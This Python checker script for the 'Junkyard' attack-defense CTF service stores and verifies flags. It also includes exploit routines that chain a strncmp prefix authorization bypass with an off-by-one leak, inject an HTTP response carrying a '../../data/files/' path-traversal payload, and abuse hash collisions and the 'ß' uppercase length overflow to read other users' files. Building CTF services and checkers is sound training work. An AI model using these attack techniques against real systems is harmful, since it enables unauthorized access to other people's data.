import io
import json
import logging
import random
import re
import string
import uuid
from dataclasses import asdict
from logging import LoggerAdapter
from os import environ
from pathlib import Path
from typing import Any

import numpy
from PIL import Image
from enochecker3 import (
    ChainDB,
    Enochecker,
    GetflagCheckerTaskMessage,
    MumbleException,
    PutflagCheckerTaskMessage, ExploitCheckerTaskMessage, PutnoiseCheckerTaskMessage, GetnoiseCheckerTaskMessage,
    HavocCheckerTaskMessage,
)
from enochecker3.utils import assert_equals, assert_in
from httpx import AsyncClient

import eno_mist
from client import JunkyardClient, assert_to_json
from flag_image_generator import gen_string_image, image_to_bitmap, Dimensions, CHAR_WIDTH
from flag_text_generator import gen_text_with_flag_checked, gen_interesting_string
from ocr import OcrEngine, SpatialOcrEngine
from text_utils import LANGUAGES, spellcheck, get_language, parse_spellchecker_output
from utils import random_username, random_password, random_filename
from usernames import generate_international_name
from collision import get_hashcode_collision

checker_port = int(environ.get("CHECKER_PORT", 8000))
service_port = int(environ.get("SERVICE_PORT", 9300))
checker = Enochecker("Junkyard", service_port)
app = lambda: checker.app

"""
Flag store 0: bmp image with flag, blacked out. exploit via cropper/inspector.
Flag store 1: text file with flag. exploit via language checks.
Flag store 2: OCR vuln.
"""

"""
TODO LIST:
- Flag store 2
"""

DEBUG_INVALID_OCR_RESULTS: Path | None = Path("/debug")
if DEBUG_INVALID_OCR_RESULTS and not DEBUG_INVALID_OCR_RESULTS.exists():
    DEBUG_INVALID_OCR_RESULTS = None


def is_potential_bug(t1: str, t2: str) -> bool:
    if t1 == t2 or len(t1) != len(t2):
        return False
    c = sum(1 for a, b in zip(t1, t2) if a != b)
    return c == 1


def random_string(length: int) -> str:
    letters = string.ascii_letters + string.digits
    return ''.join(random.choice(letters) for i in range(length))


def assert_valid_uuid(s: Any, message: str = "not a UUID") -> None:
    try:
        if not isinstance(s, str):
            raise ValueError()
        if s == "base":
            return
        uuid.UUID(s)
    except ValueError:
        logging.info(f"not a UUID: {s!r}")
        raise MumbleException(message)


def assert_decode(b: bytes) -> str:
    if type(b) is not bytes:
        raise MumbleException("Expected bytes")
    try:
        return b.decode("utf-8")
    except UnicodeDecodeError:
        raise MumbleException("Invalid UTF-8")


def bmp_to_numpy(bmp: bytes) -> numpy.ndarray:
    try:
        # return numpy.array(Image.open(io.BytesIO(bmp)), dtype=numpy.uint16)
        return numpy.array(Image.open(io.BytesIO(bmp)))
    except Exception as e:
        logging.exception(f"Cannot parse user-provided bmp: {str(e)}")
        raise MumbleException("Invalid image")


def assert_censored_image_matches(image1: numpy.ndarray, image2: numpy.ndarray, censored_area: Dimensions) -> None:
    h, w, _ = image1.shape
    # check top of censored area
    if censored_area.y > 1 and not numpy.array_equal(image1[:censored_area.y - 1, :, :],
                                                     image2[:censored_area.y - 1, :, :]):
        raise MumbleException("censored image does not match original (1)")
    # TODO do we need +1 somewhere here for patches?
    # check bottom of censored area
    if censored_area.y + censored_area.height < h - 2 and not numpy.array_equal(
            image1[censored_area.y + censored_area.height:, :, :],
            image2[censored_area.y + censored_area.height:, :, :]
    ):
        raise MumbleException("censored image does not match original (2)")
    # check left of censored area
    if censored_area.x > 0 and not numpy.array_equal(image1[:, :censored_area.x, :], image2[:, :censored_area.x, :]):
        raise MumbleException("censored image does not match original (3)")
    # check right of censored area
    if censored_area.x + censored_area.width < w - 2 and not numpy.array_equal(
            image1[:, censored_area.x + censored_area.width:, :],
            image2[:, censored_area.x + censored_area.width:, :]
    ):
        raise MumbleException("censored image does not match original (4)")


async def store_text_as_image(session: AsyncClient, db: ChainDB, text: str, logger: LoggerAdapter) -> tuple[
    str, str, str]:
    username, password = random_username(), random_password()
    logger.info(f"Registering user {username!r} / {password!r}")
    client = JunkyardClient(session)
    await client.register(username, password)

    # upload image
    seed = random.randint(0, 2 ** 32 - 1)
    flag_image, text_pos = gen_string_image(text, seed=seed)
    filename = await client.upload(random_filename("bmp"), image_to_bitmap(flag_image), "image/bmp")
    assert_valid_uuid(filename, "filename is no UUID")
    logger.info(f"Uploaded image {filename!r}")

    # censor it
    t, r, b, l = (random.randint(2, 5), random.randint(2, 2 * CHAR_WIDTH),
                  random.randint(2, 5), random.randint(2, 6 * CHAR_WIDTH))
    censored_area = Dimensions(text_pos.x + l, text_pos.y + t, text_pos.width - l - r, text_pos.height - t - b)
    result = await client.process("Censor", filename, "base", {
        "x": censored_area.x, "y": censored_area.y,
        "w": censored_area.width, "h": censored_area.height,
    })
    new_meta = assert_to_json(result)
    assert_valid_uuid(new_meta, "Censoring returned invalid result")

    # make it public
    new_meta = await client.publish(filename, new_meta)
    assert_valid_uuid(new_meta, "Publishing returned invalid result")

    await db.set("credentials", (username, password, filename, new_meta))
    await db.set("textpos", asdict(text_pos))
    await db.set("seed", (seed, text))
    await db.set("censored_area", asdict(censored_area))
    return username, filename, new_meta


@checker.putflag(0)
async def putflag_image(
        task: PutflagCheckerTaskMessage,
        session: AsyncClient,
        db: ChainDB,
        logger: LoggerAdapter,
) -> str:
    eno_mist.fix_task(task)
    username, filename, final_meta = await store_text_as_image(session, db, task.flag, logger)

    # attack info: as accepted by the lookup field on frontpage (filename/metadata)
    return f"{filename}/{final_meta}"


@checker.getflag(0)
async def getflag_image(task: GetflagCheckerTaskMessage, session1: AsyncClient, session2: AsyncClient, db: ChainDB,
                        logger: LoggerAdapter) -> None:
    eno_mist.fix_task(task)
    try:
        username, password, filename, meta = await db.get("credentials")
        textpos = Dimensions(**await db.get("textpos"))
        seed, flag = await db.get("seed")
        censored_area = Dimensions(**await db.get("censored_area"))
    except KeyError, MumbleException:
        raise MumbleException("Flag never stored (1)")

    async def fetch_authenticated_base() -> None:
        client = JunkyardClient(session1)
        await client.login(username, password)

        # check the owner is retrievable
        meta_content = await client.metadata(filename, meta)
        assert_equals(meta_content.get("owner", ""), username, "Owner in metadata is wrong")

        bmp_data = await client.process("Inspector", filename, "base", {})
        logger.info(f"Got image: {len(bmp_data)} bytes")
        decoded_bmp = bmp_to_numpy(bmp_data)
        text_bmp = decoded_bmp[textpos.y:textpos.y + textpos.height, textpos.x:textpos.x + textpos.width]

        ocr = OcrEngine()
        result = ocr.match_all(text_bmp)
        assert_equals(result, task.flag, "image OCR result does not match flag")

    async def fetch_unauthenticated_censored() -> None:
        # create other user
        client = JunkyardClient(session2)
        new_username, password = random_username(), random_password()
        await client.register(new_username, password)

        # check the owner is retrievable
        meta_content = await client.metadata(filename, meta)
        assert_equals(meta_content.get("owner", ""), username, "Owner in metadata is wrong")

        # fetch the censored image from inspector
        bmp_data = await client.process("Inspector", filename, meta, {})
        logger.info(f"Got image: {len(bmp_data)} bytes")
        decoded_bmp = bmp_to_numpy(bmp_data)[:, :, :3]
        original_image, _ = gen_string_image(flag, seed=seed)
        original_data = numpy.array(original_image)[:, :, :3]

        # check that the uncensored areas are valid
        assert_equals(decoded_bmp.shape, original_data.shape, "image size changed")
        assert_censored_image_matches(decoded_bmp, original_data, censored_area)
        # we deliberately don't check the censored area. if they fuck it up and reveal their flag - fine.

    tasks = [fetch_authenticated_base, fetch_unauthenticated_censored]
    random.shuffle(tasks)
    for current_task in tasks:
        await current_task()


@checker.putnoise(0)
async def putnoise_image(task: PutnoiseCheckerTaskMessage, session: AsyncClient, db: ChainDB,
                         logger: LoggerAdapter) -> None:
    await store_text_as_image(session, db, random_string(38), logger)


@checker.getnoise(0)
async def getnoise_image(task: GetnoiseCheckerTaskMessage, session1: AsyncClient, session2: AsyncClient, db: ChainDB,
                         logger: LoggerAdapter) -> None:
    """Crop and retrieve the image a few times, like the exploit would do it (just unauthenticated)"""
    try:
        username, password, filename, meta = await db.get("credentials")
        seed, text = await db.get("seed")
        censored_area = Dimensions(**await db.get("censored_area"))
        original_image, _ = gen_string_image(text, seed=seed)
        original_data = numpy.array(original_image)[:, :, :3]
        height, width, _ = original_data.shape
    except KeyError, MumbleException:
        raise MumbleException("Noise never stored (1)")

    client_owner = JunkyardClient(session1)
    await client_owner.login(username, password)
    client_foreign = JunkyardClient(session2)
    await client_foreign.register(random_username(), random_password())

    for attempt in range(random.randint(2, 5)):
        crop_area = Dimensions(random.randint(0, round(width * 0.65)),
                               random.randint(0, round(height * 0.65)),
                               0, 0)
        crop_area.width = random.randint(5, width - crop_area.x - 2)
        crop_area.height = random.randint(5, height - crop_area.y - 2)
        cropped_censored_area = censored_area.intersect(crop_area)
        client = client_owner if random.random() < 0.5 else client_foreign
        logger.info(
            f"Attempt: {attempt + 1}: cropping {crop_area} with {'owning' if client == client_owner else 'foreign'} user, censored is {cropped_censored_area}"
        )

        new_meta = assert_to_json(await client_owner.process("Cropper", filename, meta, {
            "t": crop_area.y,
            "r": width - crop_area.x - crop_area.width,
            "b": height - crop_area.y - crop_area.height,
            "l": crop_area.x
        }))
        assert_valid_uuid(new_meta, "Censoring returned invalid result")
        encoded_bmp = await client_foreign.process("Inspector", filename, new_meta, {})
        decoded_bmp = bmp_to_numpy(encoded_bmp)[:, :, :3]
        logger.info(f"Got image shape: {decoded_bmp.shape}")
        assert_equals((decoded_bmp.shape[1], decoded_bmp.shape[0]), (crop_area.width, crop_area.height),
                      "cropped image size not correct")
        cropped_original = original_data[
            crop_area.y:crop_area.y + crop_area.height, crop_area.x:crop_area.x + crop_area.width, :
        ]
        assert_censored_image_matches(decoded_bmp, cropped_original, cropped_censored_area)


@checker.havoc(0)  # TODO align numbers somehow
async def havoc_image(task: HavocCheckerTaskMessage, session: AsyncClient, logger: LoggerAdapter) -> None:
    """Check that people don't replace the C/Julia combination"""
    # check that cropper's authentication checks still happen in C (and noone hardcoded stuff in python)
    client_foreign = JunkyardClient(session)
    await client_foreign.register(random_username(), random_password())
    filename, meta = str(uuid.uuid4()), str(uuid.uuid4())
    resp = await client_foreign.process_unchecked("Cropper", filename, meta, {
        "t": random.randint(0, 100),
        "r": random.randint(0, 100),
        "b": random.randint(0, 100),
        "l": random.randint(0, 100)
    })
    assert_equals(500, resp.status_code, "wrong error response code")
    assert_in(b'cannot read metadata', resp.content, "wrong error message")

    # check a Julia error message
    resp = await client_foreign.process_unchecked("Inspector", filename, meta)
    error = assert_to_json(resp.content).get("detail", {})
    assert_equals(400, error.get("status", 0), "wrong error response code")
    assert_equals('Error: SystemError', error.get("body", "<missing>"), "wrong error message")


@checker.exploit(0, 0)
async def exploit_image_offbyone(task: ExploitCheckerTaskMessage,
                                 session: AsyncClient,
                                 logger: LoggerAdapter) -> str | None:
    """
    Chain two vulns: string comparison with strncmp in C (cropper), and off-by-one in Julia (inspector).

    1. Cropper compares usernames using strncmp on the raw bytes in the metadata. strncmp stops reading both strings
    after N bytes, so it won't check for a terminating \x00 or a difference in length. This means:
    If our username starts with the file's owner name, it will pass the check, and we can crop/censor any file.

    2. Off by one in Julia: TODO explain where we hide it
    Due to this off-by-one, the bottom-most row won't be censored.

    By using exploit 1, we can crop the image even if we don't own it. Cropping into the censored part moves the
    off-by-one error to different parts. We do this once per line, crop the image to height 2, and use the bottom line.
    From this we can re-assemble the uncensored image.
    """
    eno_mist.fix_task(task)
    try:
        filename, meta = task.attack_info.split("/")  # type: ignore[union-attr]
    except ValueError:
        return None

    # retrieve the owner
    client = JunkyardClient(session)
    await client.register(random_username(), random_password())
    meta_content = await client.metadata(filename, meta)

    # prefix attack - C does not check string length
    client.clear()
    my_username = meta_content["owner"] + random_string(8)
    await client.register(my_username, random_password())

    # get the image dimensions
    raw_image_bytes = await client.process("Inspector", filename, meta)
    raw_image = Image.open(io.BytesIO(raw_image_bytes))
    height = raw_image.size[1]

    SPEEDUP_FACTOR = 5  # only leak every n-th row for performance. 2, 3, 5 should be safe values.

    rows = [numpy.array(raw_image)[0]]  # reconstruct image here (we cannot leak first row)
    for y in range(0, height, SPEEDUP_FACTOR):
        if y == 0: continue
        # leak row y (counted top to bottom):
        # cut everything away but 2 rows.
        # thanks to off-by-one in Julia, the bottom-most row won't be censored.
        tmp_meta = assert_to_json(
            await client.process("Cropper", filename, meta, {"t": y - 1, "r": 0, "b": height - y - 1, "l": 0})
        )
        tmp_image = Image.open(io.BytesIO(await client.process("Inspector", filename, tmp_meta)))
        # tmp_image.show()
        rows.append(numpy.array(tmp_image)[-1])

    # assemble final image from leaked rows
    final_image = numpy.array(rows)
    # view the result:
    # Image.fromarray(final_image).show()

    ocr = SpatialOcrEngine(SPEEDUP_FACTOR) if SPEEDUP_FACTOR > 1 else OcrEngine()
    flag = ocr.match_all(final_image)
    print(f"OCR result: {flag!r}")
    return eno_mist.exploit_flag(flag, task)


# -----------------------------------------------------------------------------------------------


@checker.putflag(1)
async def putflag_text(
        task: PutflagCheckerTaskMessage,
        session: AsyncClient,
        db: ChainDB,
        logger: LoggerAdapter,
) -> str:
    eno_mist.fix_task(task)

    username, password = random_username(), random_password()
    logger.info(f"Registering user {username!r} / {password!r}")
    client = JunkyardClient(session)
    await client.register(username, password)

    # upload text file
    language, text = gen_text_with_flag_checked(task.flag)
    filename = await client.upload(random_filename("txt"), text.encode("utf-8"), "text/plain")
    logger.info(f"Uploaded text {filename!r} (language {language.name!r})")
    assert_valid_uuid(filename, "Upload returned invalid filename")

    # TODO check isolation with Java flagstore again

    await db.set("credentials", (username, password, filename))
    await db.set("language", language.name)
    return filename


@checker.getflag(1)
async def getflag_text(task: GetflagCheckerTaskMessage, session: AsyncClient, db: ChainDB,
                       logger: LoggerAdapter) -> None:
    eno_mist.fix_task(task)

    try:
        username, password, filename = await db.get("credentials")
        language = LANGUAGES[await db.get("language")]
    except KeyError, MumbleException:
        raise MumbleException("Flag never stored (2)")

    client = JunkyardClient(session)
    await client.login(username, password)

    async def fetch_reader() -> None:
        content = await client.process("Reader", filename, "base", {})
        text = assert_decode(content)
        if task.flag not in text:
            logger.info(f"Retrieved text: {text}")
            raise MumbleException("Flag not found in text")

    async def fetch_spellchecker() -> None:
        content = await client.process("Spellchecker", filename, "base", {
            "min_confidence": random.randint(20, 99) / 100.0,
            "fallback_language": language.name
        })
        text = assert_decode(content)
        if task.flag not in text:
            logger.info("Retrieved text: {text")
            raise MumbleException("Flag not found in spellchecking result")

    tasks = [fetch_reader, fetch_spellchecker]
    random.shuffle(tasks)
    for current_task in tasks:
        await current_task()


@checker.havoc(1)
async def havoc_text_spellchecker(task: HavocCheckerTaskMessage, session: AsyncClient, logger: LoggerAdapter) -> None:
    username, password = random_username(), random_password()
    logger.info(f"Registering user {username!r} / {password!r}")
    client = JunkyardClient(session)
    await client.register(username, password)

    # upload text file
    min_confidence = random.randint(0, 43) / 1000.0
    flag = ""
    if random.randint(0, 100) < 50:
        flag = gen_interesting_string()
        logger.info(f"Added *interesting* string: {flag!r}")
    language, text = gen_text_with_flag_checked(flag, required_in_spellchecker_result=False, min_confidence=min_confidence)
    filename = await client.upload(random_filename("txt"), text.encode("utf-8"), "text/plain")
    logger.info(f"Uploaded text {filename!r} (language {language.name!r})")
    assert_valid_uuid(filename, "Upload returned invalid filename")

    # run spellchecker + language detection
    content = await client.process("Spellchecker", filename, "base", {
        "min_confidence": min_confidence,
        "fallback_language": random.choice(list(LANGUAGES.keys()))
    })
    spellchecker_result = assert_decode(content)

    # reference values
    detected_language, detected_confidence = get_language(text)
    spellchecker_result_expected = spellcheck(text, detected_language, detected_confidence)
    if parse_spellchecker_output(spellchecker_result) != parse_spellchecker_output(spellchecker_result_expected):
        logger.info("=" * 80 + " text\n" + text)
        logger.info("=" * 80 + " got\n" + spellchecker_result)
        logger.info("=" * 80 + " expected\n" + spellchecker_result_expected)
        raise MumbleException(f"Spellchecker result does not match expected")


@checker.havoc(2)  # TODO align numbers somehow
async def havoc_text_errors(task: HavocCheckerTaskMessage, session: AsyncClient, logger: LoggerAdapter) -> None:
    """Check that people don't replace the dlang/go combination"""
    username, password = random_username(), random_password()
    logger.info(f"Registering user {username!r} / {password!r}")
    client = JunkyardClient(session)
    await client.register(username, password)

    response = await client.process_unchecked("Spellchecker", str(uuid.uuid4()), "base", {
        "min_confidence": random.randint(0, 100) / 100.0,
        "fallback_language": random.choice(list(LANGUAGES.keys()))
    })
    assert_equals(500, response.status_code, "wrong error response code")
    details = assert_to_json(response.content)["detail"]
    assert_equals(details, {"body": "Forbidden/Invalid file/meta\n", "status": 403}, "wrong error message")


@checker.exploit(1, 1)
async def exploit_text_spellchecker(task: ExploitCheckerTaskMessage,
                                    session: AsyncClient,
                                    logger: LoggerAdapter) -> str | None:
    """
    HTTP response injection between language-tool (D) and spellchecker (Go).
    We can give an arbitrary fallback_language, which D will check for its validity.
    On failure, error output is written to stdout (!) and the program terminates with exit code 1.
    The CGI interface ignores exit codes and tries to interpret the error message as HTTP response (with headers).
    With "\n\n" in the error message we can inject arbitrary HTTP payload (with some suffix).
    Go's JsonDecoder does not consider additional data after valid JSON an error, so we can ignore the remaining error
    message.

    In the end, we can use this chain for a path injection in the spellchecker, tricking it to load another user's
    data file as a language and using it to spell-correct a file we check. Our file includes common patterns
    like "ECSC{A", hoping that it's close enough to the actual flag to trigger a correction.
    Given that the spellchecker considers the first 7 characters only and has some error limits, we have to guess
    at most 1 character correctly. With 10 corrections per file this makes at most 3 attempts for a successful exploit.
    """
    if "/" in (task.attack_info or "/"):
        return None
    eno_mist.fix_task(task)

    # get an attacker account
    username, password = random_username(), random_password()
    logger.info(f"Registering user {username!r} / {password!r}")
    client = JunkyardClient(session)
    await client.register(username, password)

    # we have to bruteforce one character, case-insensitive, with 10 corrections per file
    words = [f"ECSC_{c}_" for c in string.ascii_uppercase] + ["ECSC___"]
    my_textfiles = [" ".join(words[i:i + 10]) for i in range(0, len(words), 10)]

    for text in my_textfiles:
        # prepare a text file
        my_filename = await client.upload("attack.txt", text.encode(), "text/plain")

        # prepare faked languagetool responses
        target_filename = task.attack_info
        fake_languagetool_response = {
            "language": f"../../data/files/{target_filename}/data",
            "confidence": 1.1
        }
        userdata = {
            "min_confidence": 1.1,
            "fallback_language": 'eng\n\n' + json.dumps(fake_languagetool_response)
        }

        # run it
        result = await client.process("Spellchecker", my_filename, "base", userdata)

        # extract flag
        flags = re.findall(task.flag_regex, result.decode("utf-8"))
        if len(flags) > 0:
            print("-" * 80)
            print(result.decode())
            print("-" * 80)
            return eno_mist.exploit_flag(flags[0], task)

    return None


# -----------------------------------------------------------------------------------------------

@checker.putnoise(1)
async def putnoise_converter(task: PutnoiseCheckerTaskMessage, session: AsyncClient, db: ChainDB,
                             logger: LoggerAdapter) -> None:
    eno_mist.fix_task(task)
    client = JunkyardClient(session)
    # register a client
    username, password = random_username(), random_password()
    firstname, lastname = await client.register(username, password)
    # # login
    await client.login(username, password)
    # flip a coin if we do TTI or ITT. Then flip another coin if we GET it again
    # TODO this is commented for now because I cant test it
    action = random.randint(0, 1)
    # action = 1
    seed = random.randint(0, 2 ** 32 - 1)
    random_strlen = random.randint(26, 38)
    if action == 0:
        logger.info("doing ITT...")
        # ITT flow. Basically putflag, with a 50:50 at the end to GET it again
        # generate a file and upload it
        action_str = "ITT"
        text = random_string(random_strlen)
        flag_image, text_pos = gen_string_image(text, seed=seed)
        # filename is folder name which contains data.bmp
        gateway_filename = await client.upload(random_filename("bmp"), image_to_bitmap(flag_image), "image/bmp")
        logger.info(f"Gateway filename: {gateway_filename}")
        assert_valid_uuid(gateway_filename, "filename is no UUID")
        converter_filename = random_filename("bmp")
        logger.info(f"Uploaded image {gateway_filename!r}, converting to {converter_filename}")
        # # do ocr once
        converter_data = {"path": converter_filename, "action": "ITT"}
        logger.info(converter_data)
        result = await client.process("Converter", gateway_filename, "base", converter_data)
        stored_data = result.decode("utf-8")
        # creds, the name under which converter stores the image
        await db.set("credentials",
                     (username, password, firstname, lastname, converter_filename, gateway_filename, text, action_str))
        logger.info(f"action = {action_str}  stored data: {stored_data!r}  text = {text!r}")
        if DEBUG_INVALID_OCR_RESULTS and is_potential_bug(stored_data, text):
            f = DEBUG_INVALID_OCR_RESULTS / f"img_team{task.team_id}_{task.current_round_id}_putnoise.bmp"
            f.write_bytes(image_to_bitmap(flag_image))
            logger.info(f"Wrote image to {f}")

        assert_equals(stored_data, text, "Converter ITT invalid result (noise)")
        do_get = random.randint(0, 1)
        if do_get == 1:
            # hey, we do a free get!
            new_data = {"path": converter_filename, "action": "GET"}
            # GET operation needs no filename in java, but in gateway (the filename in the gateway to transmit)
            result = await client.process("Converter", gateway_filename, "base", new_data)
            # print(f"Get result: {result}")
            # stored_data = result.decode("utf-8")
            decoded_bmp = bmp_to_numpy(result)
            ocr = OcrEngine()
            recovered_data = ocr.match_all(decoded_bmp)
            assert_equals(recovered_data, text, "Converter ITT invalid get result (noise)")
    else:
        logger.info("doing TTI...")
        # TTI flow. Upload text, get image, check that values match

        # upload text
        text = random_string(random_strlen)
        action_str = "TTI"
        gateway_filename = await client.upload(random_filename("txt"), text.encode("utf-8"), "text/plain")
        logger.info(f"Gateway filename: {gateway_filename}")
        assert_valid_uuid(gateway_filename, "filename is no UUID")
        logger.info(f"Uploaded text file {gateway_filename!r}")
        # to TTI 
        converter_filename = random_filename("txt")
        converter_data = {"path": converter_filename, "action": "TTI"}
        logger.info(converter_data)
        result = await client.process("Converter", gateway_filename, "base", converter_data)

        # ocr the data back
        decoded_bmp = bmp_to_numpy(result)
        ocr = OcrEngine()
        recovered_data = ocr.match_all(decoded_bmp)
        # print(recovered_data,text)
        if DEBUG_INVALID_OCR_RESULTS and is_potential_bug(recovered_data, text):
            f = DEBUG_INVALID_OCR_RESULTS / f"img_team{task.team_id}_{task.current_round_id}_putnoise.bmp"
            f.write_bytes(result)
            logger.info(f"Wrote image to {f}")
        assert_equals(recovered_data, text, "Converter TTI invalid result (noise)")
        # creds, the name under which converter stores the image
        await db.set("credentials",
                     (username, password, firstname, lastname, converter_filename, gateway_filename, text, action_str))


@checker.getnoise(1)
async def getnoise_converter(task: GetnoiseCheckerTaskMessage, session1: AsyncClient, db: ChainDB,
                             logger: LoggerAdapter) -> None:
    # basic: do a get of the file from putnoise. To know if I can test more, I need to check what exactly the calls return
    eno_mist.fix_task(task)
    client = JunkyardClient(session1)
    try:
        username, password, firstname, lastname, converter_filename, gateway_filename, text, action_str = await db.get(
            "credentials")
    except KeyError, MumbleException:
        raise MumbleException("Noise never stored (2)")
    # login
    await client.login(username, password)
    # do a GET
    new_data = {"path": converter_filename, "action": "GET"}
    # GET operation needs no gateway_filename (which is the filename in the gateway to transmit)
    result = await client.process("Converter", gateway_filename, "base", new_data)
    # we need to decode either way
    decoded_bmp = bmp_to_numpy(result)
    # text_bmp = decoded_bmp[textpos.y:textpos.y + textpos.height, textpos.x:textpos.x + textpos.width]
    ocr = OcrEngine()
    recovered_text = ocr.match_all(decoded_bmp)
    logger.info(f"action = {action_str}  bmp = {recovered_text!r}  expected text = {text!r}")
    if DEBUG_INVALID_OCR_RESULTS and is_potential_bug(recovered_text, text):
        f = DEBUG_INVALID_OCR_RESULTS / f"img_team{task.team_id}_{task.current_round_id}_{task.related_round_id}_getnoise.bmp"
        f.write_bytes(result)
        logger.info(f"Wrote image to {f}")
    assert_equals(recovered_text, text, "Recovered noise is invalid")


@checker.getflag(2)
async def getflag_converter(task: GetflagCheckerTaskMessage, session1: AsyncClient, db: ChainDB,
                            logger: LoggerAdapter) -> None:
    eno_mist.fix_task(task)
    client = JunkyardClient(session1)
    try:
        username, password, firstname, lastname, converter_filename, gateway_filename = await db.get("credentials")
    except KeyError, MumbleException:
        raise MumbleException("Flag never stored (3)")
    # # login
    await client.login(username, password)
    new_data = {"path": converter_filename, "action": "GET"}
    # GET operation needs no filename (which is the filename in the gateway to transmit)
    result = await client.process("Converter", gateway_filename, "base", new_data)
    decoded_bmp = bmp_to_numpy(result)
    # text_bmp = decoded_bmp[textpos.y:textpos.y + textpos.height, textpos.x:textpos.x + textpos.width]
    ocr = OcrEngine()
    recovered_flag = ocr.match_all(decoded_bmp)
    # logger.info(result)
    if DEBUG_INVALID_OCR_RESULTS and is_potential_bug(recovered_flag, task.flag):
        f = DEBUG_INVALID_OCR_RESULTS / f"img_team{task.team_id}_{task.current_round_id}_{task.related_round_id}_getflag.bmp"
        f.write_bytes(result)
        logger.info(f"Wrote image to {f}")
    assert_equals(recovered_flag, task.flag, "Recovered flag is invalid")


@checker.putflag(2)
async def putflag_converter(task: PutflagCheckerTaskMessage, session: AsyncClient, db: ChainDB,
                            logger: LoggerAdapter) -> str:
    eno_mist.fix_task(task)
    client = JunkyardClient(session)
    # register a client
    username, password = random_username(), random_password()
    logger.info(f"Registering user {username!r} / {password!r}")
    firstname, lastname = await client.register(username, password)
    # # login
    await client.login(username, password)
    # generate a file and upload it
    seed = random.randint(0, 2 ** 32 - 1)
    flag_image, text_pos = gen_string_image(task.flag, seed=seed)
    # filename is folder name which contains data.bmp
    gateway_filename = await client.upload(random_filename("bmp"), image_to_bitmap(flag_image), "image/bmp")
    logger.info(f"Gateway filename: {gateway_filename}")
    assert_valid_uuid(gateway_filename, "filename is no UUID")
    logger.info(f"Uploaded image {gateway_filename!r}")
    # # do ocr once
    converter_filename = random_filename("bmp")
    converter_data = {"path": converter_filename, "action": "ITT"}
    logger.info(converter_data)
    result = await client.process("Converter", gateway_filename, "base", converter_data)
    stored_flag = result.decode("utf-8")
    logger.info(f"Stored flag: {stored_flag}")
    # creds, the name under which converter stores the image
    await db.set("credentials", (username, password, firstname, lastname, converter_filename, gateway_filename))
    if DEBUG_INVALID_OCR_RESULTS and is_potential_bug(stored_flag, task.flag):
        f = DEBUG_INVALID_OCR_RESULTS / f"img_team{task.team_id}_{task.current_round_id}_putnoise.bmp"
        f.write_bytes(image_to_bitmap(flag_image))
        logger.info(f"Wrote image to {f}")
    assert_equals(stored_flag, task.flag, "Converter ITT invalid result (put)")
    # return f"{username}/{firstname}/{lastname}"
    return gateway_filename


# @checker.havoc(3)
# async def havoc_converter(task: HavocCheckerTaskMessage, session: AsyncClient, logger: LoggerAdapter) -> None:
#     pass

@checker.exploit(2, 2)
async def exploit_converter(task: ExploitCheckerTaskMessage, session: AsyncClient, logger: LoggerAdapter) -> str | None:
    """
    Two problems:
    1. Converter checks equality based on string hashcode, which is basically a polynomial. 
    So you can register a user that is equal and has same hashcode, mapping to the same key
    in the cache, thus logging in as the colliding user (in the converter).
    2. Converting to upper case does not keep the length, as e.g. ß becomes ss, allowing you
    to leak the first entry in the cache, which is the flag name.

    Exploit is now straight forward: compute a colliding user with z3, login as gameserver account, 
    and use a first GET operation to leak the flag filename, then a second GET to obtain the flag image.
    OCR the flag out and submit.
    """
    eno_mist.fix_task(task)
    client = JunkyardClient(session)
    # register a random client
    username, password, = random_username(), random_password()
    logger.info(f"Registering dummy user {username!r} / {password!r}")
    await client.register(username, password)
    # # login
    await client.login(username, password)
    meta = await client.metadata(task.attack_info, "base")  # type: ignore[arg-type]
    firstname = meta["first_name"]
    lastname = meta["last_name"]

    # computing a hash collision for firstname+lastname
    coll_first = get_hashcode_collision(firstname)
    coll_last = get_hashcode_collision(lastname)
    # register a client
    username, password, = random_username(), random_password()
    logger.info(f"Registering user {username!r} / {password!r}")
    await client.register_with_names(username, password, coll_first, coll_last)
    # # login
    await client.login(username, password)
    # generate a file and upload it. This is required because of gateway requiring a file to exist for GET?
    seed = random.randint(0, 2 ** 32 - 1)
    image, text_pos = gen_string_image("dummy", seed=seed)
    # filename is folder name which contains data.bmp
    gateway_filename = await client.upload(random_filename("bmp"), image_to_bitmap(image), "image/bmp")

    path_name = "A" * 250 + "ß" + ".bmp"
    new_data = {"path": path_name, "action": "GET"}
    # GET operation needs no filename (which is the filename in the gateway to transmit)
    result = (await client.process("Converter", gateway_filename, "base", new_data)).decode("utf-8")
    flag_file = result.split("/")[-1]
    exploit_data = {"path": flag_file.lower(), "action": "GET"}
    # GET operation needs no filename (which is the filename in the gateway to transmit)
    result2 = await client.process("Converter", gateway_filename, "base", exploit_data)
    decoded_bmp = bmp_to_numpy(result2)
    ocr = OcrEngine()
    recovered_flag = ocr.match_all(decoded_bmp)
    logger.info(recovered_flag)
    return eno_mist.exploit_flag(recovered_flag, task)


# TODO check /me somewhere


if __name__ == "__main__":
    checker.run(port=checker_port)
